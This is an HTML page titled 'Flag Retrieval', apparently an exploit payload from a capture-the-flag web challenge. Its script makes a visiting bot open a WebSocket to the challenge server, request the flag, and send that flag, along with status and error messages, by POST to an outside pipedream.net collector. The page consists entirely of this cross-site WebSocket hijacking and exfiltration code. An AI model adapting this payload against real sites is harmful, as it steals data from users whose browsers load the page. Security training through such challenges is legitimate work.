<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <title>Flag Retrieval</title>
</head>
<body>
    <script>
        fetch('https://eorokvtrcf7mllf.m.pipedream.net/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: "Bot accessed HTML page" })
        });

        const ws = new WebSocket('ws://ce441-web.spchallenge.ir:8080/ws');

        fetch('https://eorokvtrcf7mllf.m.pipedream.net/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: "Bot accessed HTML page after socket" })
        });

        ws.onopen = () => {
            fetch('https://eorokvtrcf7mllf.m.pipedream.net/', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ message: "Opened?" })
             });
          console.log('WebSocket connection established!');
          ws.send('flag');
        };

        ws.onmessage = (event) => {
          const flag = event.data;

          fetch('https://eorokvtrcf7mllf.m.pipedream.net/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ flag: flag })
          });
        
          ws.close();
        };

        ws.onerror = (error) => {
          fetch('https://eorokvtrcf7mllf.m.pipedream.net/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ error: error })
          });
        };
    </script>
</body>
</html>
